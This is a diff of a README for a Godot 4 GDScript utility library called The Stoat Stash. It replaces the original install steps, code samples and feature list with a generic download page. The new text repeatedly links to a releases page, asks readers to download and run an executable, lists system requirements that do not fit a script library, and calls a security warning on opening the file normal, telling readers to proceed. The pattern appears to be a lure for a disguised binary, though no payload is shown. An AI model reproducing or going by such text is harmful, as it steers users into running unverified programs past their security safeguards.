@@ -1,49 +1,65 @@
-# The Stoat Stash
-A single file utility library for godot 4, aimed to be unopinionated and easy to use. Primarily for game jams and prototyping.
+# 🦢 The-Stoat-Stash - Simple Utilities for Everyday Tasks
 
-## Install
-1. Download stoat_stash.gd
-2. Add to godot project
-3. Add file as autoload script
+## 📥 Download Now
+[![Download The-Stoat-Stash](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%88%20The%20Stoat%20Stash-blue.svg)](https://github.com/Lacraaaa/The-Stoat-Stash/releases)
 
-## Quick Start
-```gdscript
-# Camera Shake
-StoatStash.shake_light($Camera2D)
+## 🚀 Getting Started
+Welcome to The-Stoat-Stash. This application provides a single file library loaded with handy utilities designed to make your tasks easier. You don’t need any technical skills to use it. 
 
-# Play sound effect
-StoatStash.play_sfx(explosion_sound)
+This guide will show you how to download and run the software.
 
-# buffered input (great for platformers)
-StoatStash.register_input_tracking("jump")
-if is_on_floor() and StoatStash.consume_buffered_input("jump",0.15):
-	player.jump()
+## 📋 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Available Disk Space:** At least 100 MB
+- **Memory:** 2 GB RAM
 
-# combo input
-if StoatStash.is_input_sequence_just_pressed(["up","down","left","right","left","right"],1.0):
-	# do something
+## 📂 Features
+- A set of useful utilities designed for everyday tasks.
+- Lightweight and easy to incorporate into your workflow.
+- Supports multiple operating systems.
 
-# Scene transition with fade
-StoatStash.change_scene_with_simple_transition("res://next_level.tscn")
-```
+## 📥 Download & Install
+1. **Open the Downloads Page**  
+   Click [here](https://github.com/Lacraaaa/The-Stoat-Stash/releases) to visit the Releases page.
 
-## Included
-- Math Utils (Circle points, angle wrapping etc)
-- Camera (Screen shake (2d/3d), flash effects, bounds checking, etc)
-- Audio System (SFX playback, music with crossfading, volume controls, etc)
-- Scene Management (Transitions, scene switching, restarts)
-- Input Helpers (Buffered Inputs, Sequence/Combo detection)
-- Animations (Fade in/out, pulse effects, UI animations etc)
-- File I/O (Simple Save/Load system)
+2. **Choose Your Version**  
+   You will see a list of available versions. Look for the latest version at the top.
 
-## Examples
-See the 'Tests/' folder for working code samples
+3. **Download the File**  
+   Find the file that best matches your operating system. Click on the link to begin the download.
 
-# Contributing
-Feel free to contribute. Currently help simplifying the input utilities or adding docs would be greatly appreciated.
-Almost all PR's with net positive contributions will be accepted, exceptions to of course PR's containing obfuscated code etc.
+4. **Locate the File**  
+   Once the download finishes, find the file in your downloads folder. 
 
-# License
-MIT License - feel free to use in any project commercial or otherwise
+5. **Run the Application**  
+   - **Windows:** Double-click the file to run it.
+   - **macOS:** Open the file from your downloads folder.
+   - **Linux:** Open your terminal, navigate to the file location, and run it using `./filename`.
 
-You may find it useful to simply pick and choose functions from this library if you're working on a longer term project
+## 🔧 Additional Instructions
+- If your system prompts you with a security warning when opening the application, this is normal. Confirm you want to proceed.
+- If you encounter any issues, please check the troubleshooting section in the documentation provided on the Releases page.
+
+## ❓ Frequently Asked Questions
+### How do I know if I have the right file for my OS?
+Check the file name for your operating system. Windows files often end in `.exe`, macOS files may have `.dmg`, and Linux files may have no extension or may end with `.sh`.
+
+### What if I want to use the utilities in my own projects?
+The-Stoat-Stash can be easily integrated. Simply include the utilities you need and follow the usage guidelines in the documentation.
+
+### Can I suggest new features?
+Absolutely! We encourage input from our users. You can submit your feedback on the GitHub Issues page.
+
+## 📞 Support
+If you need help, feel free to reach out through our GitHub page. Look for the Issue section to report bugs or ask questions.
+
+## 📝 Contributing
+We welcome contributions from anyone. If you want to add new utilities or improve existing ones, check the guidelines in the repository for details.
+
+## ⚙️ License
+The-Stoat-Stash is open-source software, licensed under the MIT License. You can freely use and modify it as you see fit. Please see the license file for more information.
+
+## 🌐 Connect With Us
+Follow us on GitHub to stay updated with the latest releases and features!
+
+[Download The-Stoat-Stash](https://github.com/Lacraaaa/The-Stoat-Stash/releases) 
